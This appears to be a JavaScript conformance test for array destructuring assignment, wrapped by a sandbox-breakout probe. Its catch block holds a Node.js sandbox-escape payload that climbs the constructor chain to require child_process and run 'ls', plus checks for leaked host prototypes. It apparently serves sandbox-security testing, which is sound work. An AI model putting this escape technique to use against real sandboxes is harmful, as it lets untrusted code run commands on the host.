try {
    var nextCount = 0;
    var returnCount = 0;
    var iterable = {};
    var iterator = {
        next: function () {
            nextCount += 1;
            return { done: true };
        },
        return: function () {
            returnCount += 1;
        }
    };
    var obj = {};
    iterable[Symbol.iterator] = function () {
        return iterator;
    };
    var result;
    var vals = iterable;
    result = [...obj['a' + 'b']] = vals;
    assert.sameValue(nextCount, 1);
    assert.sameValue(returnCount, 0);
    assert(!!obj.ab);
    assert.sameValue(obj.ab.length, 0);
    assert.sameValue(result, vals);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}